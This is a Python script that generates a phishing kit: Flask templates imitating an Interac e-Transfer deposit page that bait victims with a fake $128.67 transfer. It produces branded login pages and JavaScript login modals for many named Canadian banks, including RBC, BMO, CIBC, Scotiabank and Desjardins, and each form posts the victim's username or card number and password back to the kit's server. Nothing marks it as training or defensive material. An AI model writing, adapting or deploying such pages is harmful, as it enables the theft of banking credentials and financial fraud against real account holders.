#!/usr/bin/env python3
"""
Creates specific bank pages with their respective branding
ATB → Page 1
BMO → Page 2
CIBC → Page 3
Desjardins → Page 4 (modal)
HSBC → Page 5
Laurentian → Page 6 (modal)
Manulife → Page 7 (modal)
Meridian → Page 8 (modal)
National → Page 9 (modal)
RBC → Page 10
Scotiabank → Page 11
Simplii → (modal)
"""

import os

def create_bank_page(page_num, bank_name, logo_url):
    """Create a specific bank page with login form"""
    content = f'''<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Interac e-Transfer - {bank_name} Login</title>
    <link rel="stylesheet" href="{{{{ url_for('static', filename='style.css') }}}}">
    <style>
        .bank-login-container {{
            max-width: 500px;
            margin: 50px auto;
            background-color: white;
            border-radius: 8px;
            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
            padding: 40px;
        }}
        .bank-logo-large {{
            text-align: center;
            margin-bottom: 30px;
        }}
        .bank-logo-large img {{
            max-width: 200px;
            height: auto;
        }}
        .login-form {{
            margin-top: 30px;
        }}
        .form-group {{
            margin-bottom: 20px;
        }}
        .form-group label {{
            display: block;
            margin-bottom: 8px;
            font-weight: bold;
            color: #333;
        }}
        .form-group input {{
            width: 100%;
            padding: 12px;
            border: 2px solid #e0e0e0;
            border-radius: 5px;
            font-size: 16px;
        }}
        .form-group input:focus {{
            outline: none;
            border-color: #005daa;
        }}
        .btn-login {{
            width: 100%;
            padding: 14px;
            background: #005daa;
            color: white;
            border: none;
            border-radius: 5px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            margin-top: 10px;
        }}
        .btn-login:hover {{
            background: #004a8a;
        }}
        .back-link {{
            text-align: center;
            margin-top: 20px;
        }}
        .back-link a {{
            color: #005daa;
            text-decoration: none;
        }}
        .back-link a:hover {{
            text-decoration: underline;
        }}
        .transfer-info {{
            background-color: #f0f4ff;
            padding: 20px;
            border-radius: 5px;
            margin-bottom: 30px;
            border-left: 4px solid #005daa;
        }}
        .transfer-info h3 {{
            margin-bottom: 10px;
            color: #333;
        }}
        .transfer-amount {{
            font-size: 28px;
            font-weight: bold;
            color: #005daa;
            margin: 10px 0;
        }}
    </style>
</head>
<body>
    <header class="header">
        <a href="{{{{ url_for('index') }}}}" class="logo">
            <img src="https://i.ibb.co/W4Ww7mVK/Untitled-500-x-200-px-170-x-80-px.png" alt="Interac e-Transfer" class="logo-img">
        </a>
        <nav class="nav-menu">
            <a href="#">Contact Us</a>
            <a href="#">About</a>
            <a href="#">Français</a>
            <div class="help-icon">?</div>
        </nav>
    </header>

    <div class="bank-login-container">
        <div class="transfer-info">
            <h3>Interac e-Transfer</h3>
            <div class="transfer-amount">$128.67 CAD</div>
            <p style="color: #666; margin: 5px 0;">From: MARC-ETIENNE M.LEVEILLE</p>
            <p style="color: #666; font-size: 14px;">Expires: June 1, 2018</p>
        </div>

        <div class="bank-logo-large">
            <img src="{logo_url}" alt="{bank_name}">
        </div>

        <h2 style="text-align: center; color: #333; margin-bottom: 10px;">{bank_name} Online Banking</h2>
        <p style="text-align: center; color: #666; margin-bottom: 20px;">Log in to deposit your money</p>

        <form method="POST" class="login-form">
            <div class="form-group">
                <label for="username">Username / Card Number</label>
                <input type="text" id="username" name="username" required>
            </div>
            
            <div class="form-group">
                <label for="password">Password</label>
                <input type="password" id="password" name="password" required>
            </div>
            
            <input type="hidden" name="bank" value="{bank_name}">
            
            <button type="submit" class="btn-login">Continue</button>
        </form>

        <div class="back-link">
            <a href="{{{{ url_for('index') }}}}">← Back to bank selection</a>
        </div>
    </div>
</body>
</html>'''
    
    with open(f'templates/page{page_num}.html', 'w') as f:
        f.write(content)
    print(f"✅ Created page{page_num}.html for {bank_name}")

def create_modal_pages():
    """Create pages for banks that use modals (keep the original design)"""
    modal_pages = [4, 6, 7, 8, 9]  # Desjardins, Laurentian, Manulife, Meridian, National
    
    content = '''<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Interac e-Transfer - Deposit Your Money</title>
    <link rel="stylesheet" href="{{ url_for('static', filename='style.css') }}">
</head>
<body>
    <header class="header">
        <a href="{{ url_for('index') }}" class="logo">
            <img src="https://i.ibb.co/W4Ww7mVK/Untitled-500-x-200-px-170-x-80-px.png" alt="Interac e-Transfer" class="logo-img">
        </a>
        <nav class="nav-menu">
            <a href="#">Contact Us</a>
            <a href="#">About</a>
            <a href="#">Français</a>
            <div class="help-icon">?</div>
        </nav>
    </header>

    <main class="main-container">
        <div class="deposit-header">
            <div class="deposit-info">
                <h1>Deposit Your Money</h1>
                <div class="amount">$128.67<span class="currency">CAD</span></div>
                <div class="from-info">From : MARC-ETIENNE M.LEVEILLE</div>
            </div>
            <div class="expires-info">
                <div><strong>Expires:</strong></div>
                <div>June 1, 2018</div>
                <div><strong>Reference #:</strong></div>
            </div>
        </div>

        <section>
            <h2 class="section-title">Select Your Financial Institution</h2>

            <div class="search-container">
                <div class="search-box">
                    <input type="text" placeholder="Search">
                    <div class="search-icon">🔍</div>
                </div>
            </div>

            <div class="banks-grid">
                <a href="{{ url_for('page', page_num=1) }}" class="bank-option">
                    <img src="https://i.ibb.co/svw3Qcgc/ATB-Financial-logo-svg.png" alt="ATB" class="bank-logo">
                </a>
                <a href="{{ url_for('page', page_num=2) }}" class="bank-option">
                    <img src="https://i.ibb.co/84n4Gn2v/BMO-Logo-svg.png" alt="BMO" class="bank-logo">
                </a>
                <a href="{{ url_for('page', page_num=3) }}" class="bank-option">
                    <img src="https://i.ibb.co/G45tFvLM/CIBC-logo-2021-svg.png" alt="CIBC" class="bank-logo">
                </a>
                <button class="bank-option" onclick="redirectToBank('Desjardins')">
                    <img src="https://i.ibb.co/gFbHC77K/Desjardins-Group-logo-svg.png" alt="Desjardins" class="bank-logo">
                </button>
                <a href="{{ url_for('page', page_num=5) }}" class="bank-option">
                    <img src="https://i.ibb.co/LmccvTP/HSBC-logo-2018-svg.png" alt="HSBC" class="bank-logo">
                </a>
                <button class="bank-option" onclick="redirectToBank('Laurentian')">
                    <img src="https://i.ibb.co/hJhqY3pq/Laurentian-Bank-logo-fr.png" alt="Laurentian Bank" class="bank-logo">
                </button>
                <button class="bank-option" onclick="redirectToBank('Manulife')">
                    <img src="https://i.ibb.co/B24xrR4b/Manulife-logo-svg.png" alt="Manulife Bank" class="bank-logo">
                </button>
                <button class="bank-option" onclick="redirectToBank('Meridian')">
                    <img src="https://i.ibb.co/PZzGx3st/Meridian-2019.webp" alt="Meridian" class="bank-logo">
                </button>
                <button class="bank-option" onclick="redirectToBank('National Bank')">
                    <img src="https://i.ibb.co/3mp962GJ/images.png" alt="National Bank" class="bank-logo">
                </button>
                <a href="{{ url_for('page', page_num=10) }}" class="bank-option">
                    <img src="https://i.ibb.co/DD1Q00pC/RBC-Logo-Background-PNG-Image.png" alt="RBC" class="bank-logo">
                </a>
                <a href="{{ url_for('page', page_num=11) }}" class="bank-option">
                    <img src="https://i.ibb.co/fVsK11gH/Scotiabank-Emblem.png" alt="Scotiabank" class="bank-logo">
                </a>
                <button class="bank-option" onclick="redirectToBank('Simplii')">
                    <img src="https://i.ibb.co/svw3Qcgc/ATB-Financial-logo-svg.png" alt="Simplii" class="bank-logo">
                </button>
            </div>

            <div class="or-divider">
                <span>OR</span>
            </div>

            <div class="dropdown-section">
                <div class="dropdown-group">
                    <label for="financial-institution">Select Your Financial Institution</label>
                    <select id="financial-institution">
                        <option value="">Choose your bank...</option>
                        <option value="atb">ATB Financial</option>
                        <option value="bmo">BMO</option>
                        <option value="cibc">CIBC</option>
                        <option value="desjardins">Desjardins</option>
                    </select>
                </div>
                <div class="dropdown-group">
                    <label for="province">Select Province or Territory</label>
                    <select id="province">
                        <option value="">Choose province...</option>
                        <option value="ab">Alberta</option>
                        <option value="bc">British Columbia</option>
                        <option value="mb">Manitoba</option>
                        <option value="nb">New Brunswick</option>
                        <option value="nl">Newfoundland and Labrador</option>
                        <option value="ns">Nova Scotia</option>
                        <option value="on">Ontario</option>
                        <option value="pe">Prince Edward Island</option>
                        <option value="qc">Quebec</option>
                        <option value="sk">Saskatchewan</option>
                    </select>
                </div>
            </div>
        </section>
    </main>

    <script>
        function redirectToBank(bankName) {
            showLoginModal(bankName);
        }

        function showLoginModal(bankName) {
            const modal = document.createElement('div');
            modal.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.5);display:flex;align-items:center;justify-content:center;z-index:1000;';
            
            modal.innerHTML = `
                <div style="background:white;padding:30px;border-radius:8px;max-width:400px;width:90%;">
                    <h2 style="margin-bottom:20px;color:#333;">${bankName} Login</h2>
                    <form method="POST" action="{{ url_for('page', page_num=page_num) }}">
                        <div style="margin-bottom:15px;">
                            <label style="display:block;margin-bottom:5px;font-weight:bold;">Username</label>
                            <input type="text" name="username" required style="width:100%;padding:10px;border:2px solid #e0e0e0;border-radius:5px;">
                        </div>
                        <div style="margin-bottom:20px;">
                            <label style="display:block;margin-bottom:5px;font-weight:bold;">Password</label>
                            <input type="password" name="password" required style="width:100%;padding:10px;border:2px solid #e0e0e0;border-radius:5px;">
                        </div>
                        <input type="hidden" name="bank" value="${bankName}">
                        <div style="display:flex;gap:10px;">
                            <button type="submit" style="flex:1;padding:12px;background:#005daa;color:white;border:none;border-radius:5px;font-weight:bold;cursor:pointer;">Login</button>
                            <button type="button" onclick="this.closest('div').parentElement.parentElement.remove()" style="flex:1;padding:12px;background:#ccc;color:#333;border:none;border-radius:5px;font-weight:bold;cursor:pointer;">Cancel</button>
                        </div>
                    </form>
                </div>
            `;
            
            document.body.appendChild(modal);
        }
    </script>
</body>
</html>'''
    
    for page_num in modal_pages:
        with open(f'templates/page{page_num}.html', 'w') as f:
            f.write(content)
    print(f"✅ Created modal pages: {modal_pages}")

def main():
    """Create all bank-specific pages"""
    print("\n🏦 Creating Bank-Specific Pages\n")
    print("=" * 50)
    
    # Create dedicated login pages for specific banks
    banks = [
        (1, "ATB Financial", "https://i.ibb.co/svw3Qcgc/ATB-Financial-logo-svg.png"),
        (2, "BMO", "https://i.ibb.co/84n4Gn2v/BMO-Logo-svg.png"),
        (3, "CIBC", "https://i.ibb.co/G45tFvLM/CIBC-logo-2021-svg.png"),
        (5, "HSBC", "https://i.ibb.co/LmccvTP/HSBC-logo-2018-svg.png"),
        (10, "RBC", "https://i.ibb.co/DD1Q00pC/RBC-Logo-Background-PNG-Image.png"),
        (11, "Scotiabank", "https://i.ibb.co/fVsK11gH/Scotiabank-Emblem.png"),
    ]
    
    for page_num, bank_name, logo_url in banks:
        create_bank_page(page_num, bank_name, logo_url)
    
    # Create pages that use modals
    create_modal_pages()
    
    print("\n" + "=" * 50)
    print("✨ All bank pages created successfully!")
    print("\nBank Routing:")
    print("  ATB → Page 1")
    print("  BMO → Page 2")
    print("  CIBC → Page 3")
    print("  Desjardins → Page 4 (modal)")
    print("  HSBC → Page 5")
    print("  Laurentian → Page 6 (modal)")
    print("  Manulife → Page 7 (modal)")
    print("  Meridian → Page 8 (modal)")
    print("  National → Page 9 (modal)")
    print("  RBC → Page 10")
    print("  Scotiabank → Page 11")
    print("  Simplii → Modal")
    print("=" * 50 + "\n")

if __name__ == "__main__":
    main()
